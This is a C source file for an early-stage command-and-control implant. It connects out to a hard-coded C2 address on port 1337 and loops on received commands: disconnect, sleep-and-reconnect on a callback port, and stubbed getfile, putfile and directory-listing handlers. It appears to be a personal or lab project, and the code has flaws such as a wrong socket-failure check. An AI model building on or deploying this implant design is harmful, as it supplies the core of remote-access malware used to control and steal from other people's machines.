// Patrick Sacchet
// This file handles startup functionality and command handling 

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "Common.h"
#include "Disconnect.h"


// Callout and establish connection to C2
int callout(uint16_t port, const char* ip_address, int* client_fd)
{
    int status = 1;
    struct sockaddr_in address;

    address.sin_family = AF_INET;
    address.sin_port = htons(port);

    *client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0)
    {
        printf("Failed to create socket\n");
        status = 0;
        goto cleanup;
    }

    // This is the address of the C2 Docker container for now....
    status = inet_pton(AF_INET, ip_address, &address.sin_addr);
    if (status <= 0)
    {
        printf("Failed inet_pton\n");
        goto cleanup;
    }

    status = connect(*client_fd, (struct sockaddr*)&address, sizeof(address));
    if (status < 0)
    {
        printf("Failed connect, error 0x%X (%s)\n", errno, strerror(errno));
        status = 0;
        goto cleanup;
    }

    // If our return was a 0, make sure we set it to 'success' prior to returning 
    if (status == 0)
    {
        status = 1;
    }


cleanup:
    return status;
}


// Loop on commands we receive from the C2 until we are told to sleep or exit
int handleCommands(int* client_fd)
{
    int status = 1;
    ssize_t valread = 0;
    bool exit = false;
    
    while (!exit)
    {
        char buffer [1024] = { 0 };
        Command* command;

        // Read our command
        valread = read(*client_fd, buffer, sizeof(buffer)-1);
        if (valread <= 0)
        {
            printf("Failed to read from socket\n");
            status = 0;
            goto cleanup;
        }

        // Parse our bytes to see what command we're dealing with 
        command = (Command*)buffer;

        switch (command->command)
        {
            case disconnect:
                printf("Received disconnect command!\n");  
                //printf("Value for disconnect: 0x%X\n", command->disconnectcommand.sleep);
                //printf("Value for callback port: 0x%X\n", command->disconnectcommand.callbackport);
                
                // If the C2 says no sleep then we just exit
                if (command->disconnectcommand.sleep == 0)
                {
                    printf("Exiting implant...\n");

                    if (!handleDisconnectExit(client_fd))
                    {
                        printf("Failed to handle disconnect!\n");                        
                    }
                    // We exit regardless here 
                    exit = true;
                }

                else
                {
                    printf("Putting implant to sleep for %i seconds; callback port is on %i\n", (command->disconnectcommand.sleep/1000), command->disconnectcommand.callbackport);

                    if (!handleDisconnectSleep(client_fd, command->disconnectcommand.sleep, command->disconnectcommand.callbackport))
                    {
                        printf("Failed to handle disconnect and reconnect!\n");
                        exit = true;
                    }
                }
                break;

            case getfile:
                printf("Received getfile command!\n");
                break;

            case putfile:
                printf("Received putfile command!\n");
                break;

            case dirlist:
                printf("Received dirlist command!\n");
                break;

            default:
                printf("ERROR: Failed to recognize command: 0x%X\n", command->command);
                break;
        }
    }

cleanup:
    return status;
}


// Main entry point for this program; reach out to C2 and establish connection
    // Will also parse reponses from C2 and call into appropiate funcitonality + send collected data 
int main() 
{
    const char* ip_address = "172.17.0.3";
    uint16_t port = 1337;
    int client_fd = 0;

    printf("Establishing connection to C2...\n");

    if (!callout(port, ip_address, &client_fd))
    {
        printf("Failed our callout to C2\n");
        return 0;
    }

    printf("Successfully connected to C2; starting implant loop...\n");

    if (!handleCommands(&client_fd))
    {
        printf("Failed handling commands from C2!\n");
        
    }

    


    return 0;

// TODO: cleanup for socket close and stuff 
}